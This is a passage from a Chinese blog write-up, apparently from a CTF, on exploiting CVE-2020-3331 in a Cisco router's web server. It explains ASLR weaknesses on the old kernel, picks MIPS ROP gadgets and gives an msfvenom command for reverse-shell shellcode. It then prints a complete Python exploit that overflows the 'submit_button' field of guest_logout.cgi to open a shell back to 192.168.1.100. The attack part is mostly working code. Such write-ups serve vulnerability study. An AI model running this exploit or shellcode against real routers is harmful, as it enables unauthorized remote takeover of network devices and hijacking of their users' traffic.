<p>但是 aslr 最开始是在 2005 年的 2.6.12 内核版本中引入的。2.6.22 的版本虽然没有 <code>CONFIG_COMPAT_BRK</code> ，但理论上 1 等级的 aslr 应该是能满足的。也许是版本比较早， aslr 的实现还不是很全面，导致 libc 没能实现地址随机化。搜索 2.6.22 版本找到这篇解释：《<a target="_blank" rel="noopener" href="https://securityetalii.es/2013/02/03/how-effective-is-aslr-on-linux-systems/">How Effective is ASLR on Linux Systems? | Security et alii</a>》。</p>
<p>ASLR 的有效性受可用的熵量的限制，比如 32 位系统提供给ALSR的熵比 64 位的更少。跟早期的 WINDOWS 第三方软件中不参与 ASLR 的 DLL 文件类似，Linux 2.6.22 之前的内核中，VDSO（linux-vdso.so）未能实现随机化，始终位于固定位置。</p>
<p>因此尽管 libc.so.0 开启了 PIE，地址还是固定的。</p>
<p><img src="https://i.loli.net/2021/10/10/hpxKHSYDN6aymuq.png"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>从刚刚 <code>cat /proc</code> 的结果来看，httpd 程序加载的libc 地址是 <strong>0x2af98000</strong>，可以用。我们选择偏移小一点的这个gadget。按 g 跳到对应的函数后，找到 var_20 的值是 -0x20。所以这里是把 $sp+0x18 的地址存到 $a0 中，最后 jmp 到 $s0。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.stackfinder()</span><br><span class="line">---------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                         |  Control Jump                  |</span><br><span class="line">---------------------------------------------------------------------------------------------------</span><br><span class="line">......</span><br><span class="line">|  <span class="number">0x000257A0</span>  |  addiu $a0,$sp,<span class="number">0x38</span>+var_20                      |  jalr  $s0                     |</span><br><span class="line">......</span><br><span class="line">--------------------------------------------------------------------------------------------------</span><br><span class="line">Found <span class="number">32</span> matching gadgets</span><br></pre></td></tr></table></figure>

<p>由于 httpd 什么保护都没开启，直接返回到栈上执行shellcode 就可以了。我们把 shellcode 写在+0x18的位置，既然存到了 $a0 中，那就找个 jmp 到 $a0 的gadget。因为上一段 gadget 最后会 <code>jalr  $s0</code>，覆盖的时候把 $s0 的位置覆盖成下面这段 gadget就可以了，具体偏移也是用 cyclic 测。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|  Address     |  Action                                              |  Control Jump    |</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">|  0x0003D050  |  move $t9,$a0                                        |  jalr  $a0       |</span><br></pre></td></tr></table></figure>

<p>shellcode的话，第一次使用 msfvenom 生成。感觉确实比 shell-storm 的好用，需要修改的地方可以用命令指定，不用手动改。</p>
<p><a target="_blank" rel="noopener" href="https://apt.metasploit.com/">官网</a>下载后，解压就可以用了：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i metasploit-framework_6.1.9+20211003102528_1rapid7-1_amd64.deb</span><br></pre></td></tr></table></figure>

<p>使用的时候选择的是反弹shell，指定ip、port、arch、platform 以及文件类型、输出文件名。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/mipsle/shell_reverse_tcp  LHOST=192.168.1.100 LPORT=34567 --arch mipsle --platform linux -f py -o shellcode.py </span><br></pre></td></tr></table></figure>

<p>en一般来说，使用桥接网络的话虚拟机的地址也是 192.168.1.x。但我没配置好，使用桥接后网卡虽然显示是以太网卡，但没有自动分配地址，手动分配也连不上网… 使用NAT模式也是可以的，只要他们能互相 ping… 很可惜路由器 ping 不通虚拟机。观察发现从 虚拟机 telnet 路由器，也是从本机 ip 192.168.1.100 出去的。因此这里反弹 shell 的 ip 选的是本机的 ip，只能在本机监听了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">libcbase=<span class="number">0x2af98000</span></span><br><span class="line">add_a0=libcbase+<span class="number">0x257a0</span></span><br><span class="line">jmp_a0=libcbase+<span class="number">0x3d050</span></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line"></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x87\x07\x0e\x3c&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x87\x07\xce\x35\xe4\xff\xae\xaf\x01\x64\x0e\x3c\xc0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\x01&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">49</span>+p32(jmp_a0)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(add_a0)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+buf</span><br><span class="line">param= &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;00:0c:29:59:12:72&quot;</span>,</span><br><span class="line">        <span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;status_guestnet.asp&quot;</span>+payload,</span><br><span class="line">        <span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.162.168&quot;</span>&#125;</span><br><span class="line">requests.post(url, data=param, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>



<p>拿到 shell 的时候是在 www 目录下。</p>
<p><img src="https://i.loli.net/2021/10/10/qY4pMbsrVnd2hHv.png"></p>
<p>这道题目在比赛的时候，除了要求拿到 shell，还需要劫持 DNS，使通过这个路由器访问网站的时候，访问的是我们写的网站。猜测是在本机上运行一个 web 应用，再修改 <code>/etc/hosts</code> 文件如下。具体还得再问问 web 师傅😟</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.100 xxx.xxx.xxx</span><br></pre></td></tr></table></figure>


    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/mips/" rel="tag"># mips</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/09/13/embedded-heap/" rel="prev" title="uClibc | embedded_heap-0ctf2019final">
      <i class="fa fa-chevron-left"></i> uClibc | embedded_heap-0ctf2019final
    </a></div>
      <div class="post-nav-item">
    <a href="/2021/10/11/ciscoRV130w/" rel="next" title="cve-2021-34730">
      cve-2021-34730 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="nav-number">1.</span> <span class="nav-text">准备工作</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#qemu-%E6%A8%A1%E6%8B%9F"><span class="nav-number">1.2.</span> <span class="nav-text">qemu 模拟</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#qemu-system"><span class="nav-number">1.2.1.</span> <span class="nav-text">qemu-system</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mount"><span class="nav-number">1.2.2.</span> <span class="nav-text">mount</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nvram"><span class="nav-number">1.2.3.</span> <span class="nav-text">nvram</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mipsel-linux-gcc"><span class="nav-number">1.2.4.</span> <span class="nav-text">mipsel-linux-gcc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gdbserver"><span class="nav-number">1.2.5.</span> <span class="nav-text">gdbserver</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9C%9F%E6%9C%BA%E8%AE%BE%E5%A4%87"><span class="nav-number">1.3.</span> <span class="nav-text">真机设备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9E%E6%8E%A5"><span class="nav-number">1.3.1.</span> <span class="nav-text">连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">1.3.2.</span> <span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gdb%E8%B0%83%E8%AF%95"><span class="nav-number">1.3.3.</span> <span class="nav-text">gdb调试</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2020-3331"><span class="nav-number">2.</span> <span class="nav-text">CVE-2020-3331</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86"><span class="nav-number">2.1.</span> <span class="nav-text">远程登陆</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#libc-%E5%9F%BA%E5%9D%80"><span class="nav-number">2.3.</span> <span class="nav-text">libc 基址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.4.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">7ee1n</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">11</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://custuvo.github.io/" title="https:&#x2F;&#x2F;custuvo.github.io&#x2F;" rel="noopener" target="_blank">❤Cu3tuv0❤</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://brooke-hub.github.io/" title="https:&#x2F;&#x2F;brooke-hub.github.io&#x2F;" rel="noopener" target="_blank">Wendy</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://r1nd0.github.io/" title="https:&#x2F;&#x2F;r1nd0.github.io&#x2F;" rel="noopener" target="_blank">R1nd0神</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">7ee1n</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>

<script src="/js/bookmark.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : 'gf3X3bhGvA1TTaRXpIJrXU8Q-gzGzoHsz# Your leancloud application appid',
      appKey     : 'PhQvOaVhLbUmODpCMAScvMqy# Your leancloud application appkey',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : false,
      lang       : '' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":180,"height":360},"dialog":{"enable":false},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
